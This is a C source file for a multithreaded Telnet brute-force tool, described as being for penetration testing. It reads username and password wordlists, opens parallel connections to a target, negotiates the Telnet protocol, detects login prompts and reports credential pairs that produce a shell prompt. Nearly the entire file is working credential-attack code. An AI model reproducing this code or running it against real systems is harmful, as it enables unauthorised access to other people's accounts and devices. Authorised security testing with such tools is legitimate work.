/*
 * brute_telnet.c - Telnet bruteforce, for penetration test.
 *
 * brute force crack the remote authentication service telnet, parallel
 * connection.
 *
 * Copyright (C) 2017 Luca Petrocchi <petrocchi@myoffset.me>
 *
 * DATE:	16/02/2017
 * AUTHOR:	Luca Petrocchi
 * EMAIL:	petrocchi@myoffset.me
 * WEBSITE	https://myoffset.me/
 * URL:		https://github.com/petrocchi
 *
 *
 *
 * brute_telnet is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * brute_telnet is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 *
 *
 * For compile: gcc -o main main.c -pthread
 *
 */

#define _GNU_SOURCE

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/wait.h>
#include <pthread.h>

#define DO 0xfd
#define WONT 0xfc
#define WILL 0xfb
#define DONT 0xfe
#define CMD 0xff
#define CMD_ECHO 1
#define CMD_WINDOW_SIZE 31
#define BIGLINE 50
#define BUFLEN 20
#define BUFF_R_SIZE 2048
#define KNOWN_LOGIN_SIZE 3
#define KNOWN_PSW_SIZE 3
#define KNOWN_PRT_SIZE 6
#define KNOWN_BAD_SIZE 3

uint8_t getrecord(FILE *fd_user, char *username, FILE *fd_pass, char *password);
char *getentry(FILE *fd, char *line);
ssize_t Send(int sockfd, const void *buf, size_t len, int flags);
ssize_t Recv(int sockfd, void *buf, size_t len, int flags);
void sendch(int sockfd, char *buf_all);
uint8_t trycredentials(int sockfd, char *username, char *password);
void negotiate(int sock, unsigned char *buf, int len);
int parse(char *buff, int type);
void *t_conn(void *args);

struct targs {
	struct sockaddr_in *taddr;
	char *tusername;
	char *tpassword;
	uint16_t tforked;
	uint8_t found;
	uint8_t verbose;
};

int main(int argc , char *argv[]) {
	struct sockaddr_in addr;
	struct hostent *h;
	uint16_t i, wt;
	uint8_t verbose = 0;
	char line_user[BIGLINE];
	char line_pass[BIGLINE];
	char *username, *password;
	FILE *fd_user, *fd_pass;

	printf("[+] Login Bruteforce telnet server, for penetration test...\n");

	if ((argc != 6) && (argc != 7)) {
		printf("\nUsage: %s <host> <port> <userfile> <passfile> <n thread> [options]\n\n"
		       "<userfile>\tFile user list\n"
		       "<passdile>\tFile password list\n"
		       "<n threads>\tNumober of parallel threads\n"
		       "\nOptions:\n\t-v\tVerbose mode\n\nExamples:\n"
		       "\t./brute_telnet 192.168.1.1 23 user.txt wordlist.txt 30\n"
		       "\t./brute_telnet 192.168.1.1 23 user.txt wordlist.txt 30 -v\n\n", argv[0]);
		return(1);
	}

	printf("[+] Target: %s:%s\n", argv[1], argv[2]);

	const uint16_t NUM_T = atoi(argv[5]);

	struct targs tdata[NUM_T];
	pthread_t tid[NUM_T];

	if((argc == 7) && (!strcmp(argv[6], "-v")) ) {
		verbose = 1;
	}

	for(i=0; i<NUM_T; i++) {			// inizialized forked variable
		if((tdata[i].taddr = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in))) == NULL) {
			perror("malloc");
			exit(1);
		}

		memset(&tdata[i].taddr, 0, sizeof(addr));
		tdata[i].taddr = (struct sockaddr_in *)&addr;
		tdata[i].tforked = 0;
		tdata[i].found = 0;
		tdata[i].verbose = verbose;
	}

	username = line_user;
	password = line_pass;

	bzero(line_user, BIGLINE);
	bzero(line_pass, BIGLINE);

	if(!(fd_user = fopen(argv[3], "r"))) {
		perror(argv[3]);
		return(1);
	}

	if(!(fd_pass = fopen(argv[4], "r"))) {
		perror(argv[3]);
		return(1);
	}

	getentry(fd_user, username);		// inizialize loop get credentials from wordlist

	if(!(h = gethostbyname(argv[1]))) {
		perror("gethostbyname");
		return(1);
	}

	bzero(&addr, sizeof(addr));
	addr.sin_addr.s_addr = ((struct in_addr *) h->h_addr_list[0])->s_addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(atoi(argv[2]));

	i = 0;
	while(!(tdata[i].found)) {
		if(i == NUM_T)
			i = 0;

		if(tdata[i].tforked == 0) {
			tdata[i].tforked = 1;						// set busy

			if((getrecord(fd_user, username, fd_pass, password)))		// get user and password from wordlist
				goto finish;

			if((tdata[i].tusername = (char *)malloc(strlen(username) +1)) == NULL) {
				perror("malloc");
				exit(1);
			}
			strcpy(tdata[i].tusername, username);

			if((tdata[i].tpassword = (char *)malloc(strlen(password) +1)) == NULL) {
				perror("malloc");
				exit(1);
			}
			strcpy(tdata[i].tpassword, password);

			if(pthread_create(&tid[i], NULL, t_conn, (void *)&tdata[i])) {
				perror("pthread_create");
				exit(1);
			}

		}

		i++;
	}

	finish:

	for(wt=0; wt<NUM_T; wt++) {
		if(tdata[wt].tforked == 1)
			if(pthread_join(tid[wt], NULL)) {
				perror("pthread_join");
				exit(-1);
			}
	}

	fclose(fd_user);
	fclose(fd_pass);

	printf("\n[+] Finish\n");

	exit(0);
}

uint8_t getrecord(FILE *fd_user, char *username, FILE *fd_pass, char *password) {
	getentry(fd_pass, password);
	if(password[0] == '\0') {
		getentry(fd_user, username);
		if(username[0] == '\0')
			return(1);
		else if(username[0] != '\0') {
			fseek(fd_pass, 0, SEEK_SET);
			getentry(fd_pass, password);
		}
		else
			return(1);
	}

	return(0);
}

char *getentry(FILE *fd, char *line) {
	char *cut;

	bzero(line, BIGLINE);

	if(fgets(line, BIGLINE, fd)) {
		if((cut = strchr(line, '\n')))
			*cut = '\0';

		return(line);
	}

	return('\0');
}

ssize_t Send(int sockfd, const void *buf, size_t len, int flags) {
	ssize_t rc;

	if((rc = send(sockfd, buf, len, flags)) < 0) {
		perror("send");
		exit(1);
	}
	return(rc);
}

ssize_t Recv(int sockfd, void *buf, size_t len, int flags) {
	ssize_t rc;

	if((rc = recv(sockfd, buf, len, flags)) < 0) {
		perror("recv");
		exit(1);
	}
	return(rc);
}

void sendch(int sockfd, char *buf_all) {
	char buf[1];
	int i;

	for(i = 0; i < strlen(buf_all); i++) {
		buf[0] = buf_all[i];

		Send(sockfd, buf, 1, 0);
	}

	buf[0] = '\r';
	Send(sockfd, buf, 1, 0);
}

uint8_t trycredentials(int sockfd, char *username, char *password) {
	struct timeval ts;
	ts.tv_sec = 1;
	ts.tv_usec = 0;
	unsigned char buf[BUFLEN + 1];
	unsigned char buff_r[BUFF_R_SIZE];
	ssize_t rc;
	int level, flag = 0;	// flag for level of login: [0:inizialize || 1: parse form login || 2: parse form password || 3: parse prompt]
	fd_set fds;
	int connfd;

	bzero(buff_r, BUFF_R_SIZE);

	while(1) {
		FD_ZERO(&fds);
		FD_SET(sockfd, &fds);
		FD_SET(0, &fds);

		if((connfd = select(sockfd + 1, &fds, (fd_set *) 0, (fd_set *) 0, &ts)) < 0) {
			perror("select");
			return(1);
		}

		else if(sockfd != 0 && FD_ISSET(sockfd, &fds)) {
			if(!(rc = Recv(sockfd, buf, 1, 0))) {
				printf("Connection closed by local host!\n\r");
				return(2);
			}

			if (buf[0] == CMD) {
				if(!(rc = Recv(sockfd, (buf + 1), 2, 0))) {
					printf("Connection closed by the remote host!\n\r");
					return(2);
				}

				negotiate(sockfd, buf, 3);
			}
			else {
				buf[1] = '\0';
//				printf("%s", buf);	// DEBUG

				if(strlen((const char *)buff_r) < (BUFF_R_SIZE - 2))
					strcat((char *)buff_r, (const char *)buf);
				else
					printf("[ERROR] Overload of buff_r for parsing! edite code and change BUFF_R_SIZE\n");

				fflush(0);
			}
		}

		else if(!(FD_ISSET(sockfd, &fds))) {
			if((level = parse((char *)buff_r, flag)) > 0) {			// 0:login, 1:password, 2:proprt
				switch(level) {
					case 1:	{ sendch(sockfd, username); break; }	// 1: send login
					case 2:	{ sendch(sockfd, password); break; }	// 2: send password
					case 3: return(0);				// 3: good credentials, I have prompt
					default:break;
				}
				flag = level;
			}
			else {
				if(parse((char *)buff_r, 3) == 4)
					return(1);					// bad credentials, no login
			}
		}
	}
}

void negotiate(int sock, unsigned char *buf, int len) {
	unsigned char str_term[2][10] = {
		{ 255, 251, 31 },
		{255, 250, 31, 0, 80, 0, 24, 255, 240}
	};
	int i;

	if(buf[1] == DO && buf[2] == CMD_WINDOW_SIZE) {
		Send(sock, str_term[0], 3 , 0);
		Send(sock, str_term[1], 9, 0);

		return;
	}

	for (i = 0; i < len; i++) {
		if(buf[i] == DO)
			buf[i] = WONT;
		else if(buf[i] == WILL)
			buf[i] = DO;
	}

	Send(sock, buf, len , 0);
}

int parse(char *buff, int type) {
	char *KNOWN_LOGIN[KNOWN_LOGIN_SIZE] = { "ogin:", "last login", "sername" };
	char *KNOWN_PSW[KNOWN_PSW_SIZE] = { "asswor", "asscode", "ennwort" };
	char *KNOWN_PRT[KNOWN_PRT_SIZE] = { "?", "/", ">", "%", "$", "#" };
	char *KNOWN_BAD[KNOWN_BAD_SIZE] = { "incorrect", "bad log", "no log" };
	int i;
	int p_size[4];
	char **p_known[4];

	p_size[0] = KNOWN_LOGIN_SIZE;
	p_size[1] = KNOWN_PSW_SIZE;
	p_size[2] = KNOWN_PRT_SIZE;
	p_size[3] = KNOWN_BAD_SIZE;

	p_known[0] = (char **)&KNOWN_LOGIN;
	p_known[1] = (char **)&KNOWN_PSW;
	p_known[2] = (char **)&KNOWN_PRT;
	p_known[3] = (char **)&KNOWN_BAD;

	for(i = 0; i < p_size[type]; i++) {
		if(strcasestr(buff, p_known[type][i]) != NULL)
			return(type + 1);
	}

	return(-1);
}

void *t_conn(void *args) {
	struct targs *tdata = (struct targs *)args;
	int sockfd;

	if(tdata->verbose == 1)
		printf("telnet://%s@%s:%d %s\n",
		       tdata->tusername,
		       inet_ntoa(tdata->taddr->sin_addr),
		       __builtin_bswap16(tdata->taddr->sin_port),
		       tdata->tpassword);

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket");
		return(NULL);
	}

	if((connect(sockfd, (struct sockaddr *)tdata->taddr , sizeof(*tdata->taddr))) < 0) {
		perror("connect");
		exit(1);
	}

	if(!(trycredentials(sockfd, tdata->tusername, tdata->tpassword))) {
		printf("\n[LOGIN FOUND] %s:%s\n", tdata->tusername, tdata->tpassword);
		tdata->found = 1;
	}

	close(sockfd);

	tdata->tforked = 0;

	pthread_exit(NULL);
}

